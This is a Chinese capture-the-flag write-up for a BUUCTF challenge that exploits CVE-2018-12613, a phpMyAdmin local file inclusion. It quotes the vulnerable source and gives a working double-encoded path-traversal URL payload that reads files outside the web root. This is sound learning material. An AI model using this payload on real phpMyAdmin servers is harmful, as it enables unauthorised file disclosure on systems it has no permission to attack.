@@ -1,1 +1,57 @@
+日期                                  题目                                    平台                        
+2026/5/7                       [GWCTF 2019]我有一个数据库                       BUUCTF
+
+攻击过程：
+  第一步：使用burp抓包，没有什么有意义的结果。使用dirsearch扫描，发现有/phpmyadmin/开放
+  第二步：我查找了一些phpmyadmin的漏洞，有cve-2018-12613-PhpMyadmin后台文件包含。CVE中有源代码，分析一下，得到最有可能攻破的源码是index.php中的一个文件包含漏洞，如下
+                          if (! empty($_REQUEST['target'])
+                          && is_string($_REQUEST['target'])
+                          && ! preg_match('/^index/', $_REQUEST['target'])
+                          && ! in_array($_REQUEST['target'], $target_blacklist)
+                          && Core::checkPageValidity($_REQUEST['target'])
+                          ) {
+                              include $_REQUEST['target'];
+                              exit;
+                            }
+        可以看到，传入target参数的值，只要不是index开头，不是黑名单的字符串（黑名单字符串是'import.php', 'export.php'），以及满足一个方法checkPageValidtity即可成功
+  第三步：查看checkPageValidtity的代码（代码如下），代码中可以看出，只要上传的参数为白名单中的一员，或者是白名单加上问号（或者问号的编码）加上字符串即可，而白名单中有字符串db_sql.php，db_events.php等等，
+          所以只用构造一个index.php?target=db_sql.php%253f/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag  即可成功得到flag文件内容
+              问题一：为什么将?两次编码：因为如果不编码问号，那就只会传入两个问号之间的内容，即db_sql.php。如果只编码一次可能会被前端服务器解码一次变为?，又会只传入db_sql.php
+              问题二：为什么要把../编码为%2e%2e%2f：因为WAF禁止../通过
+                           public static function checkPageValidity(&$page, array $whitelist = [])
+                            {
+                                if (empty($whitelist)) {
+                                    $whitelist = self::$goto_whitelist;
+                                }
+                                if (! isset($page) || !is_string($page)) {
+                                    return false;
+                                }
+                        
+                                if (in_array($page, $whitelist)) {
+                                    return true;
+                                }
+                        
+                                $_page = mb_substr(
+                                    $page,
+                                    0,
+                                    mb_strpos($page . '?', '?')
+                                );
+                                if (in_array($_page, $whitelist)) {
+                                    return true;
+                                }
+                        
+                                $_page = urldecode($page);
+                                $_page = mb_substr(
+                                    $_page,
+                                    0,
+                                    mb_strpos($_page . '?', '?')
+                                );
+                                if (in_array($_page, $whitelist)) {
+                                    return true;
+                                }
+                        
+                                return false;
+                            }
+
+    
 
